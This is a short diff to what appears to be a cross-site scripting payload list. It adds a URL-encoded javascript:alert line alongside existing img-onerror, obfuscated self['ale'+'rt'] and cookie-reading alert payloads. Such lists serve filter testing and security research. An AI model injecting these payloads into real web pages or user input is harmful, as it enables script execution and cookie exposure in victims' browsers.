@@ -1,4 +1,5 @@
 <samp><script><section><img onerror="alert()" src />
+/javascript:alert%25281%2529/.source; :>
 <samp><script><section><img onerror="self['ale'+'rt']()" src />
 <section><img onerror="self['ale'+'rt']()" src />
 alert?.(document?.cookie)
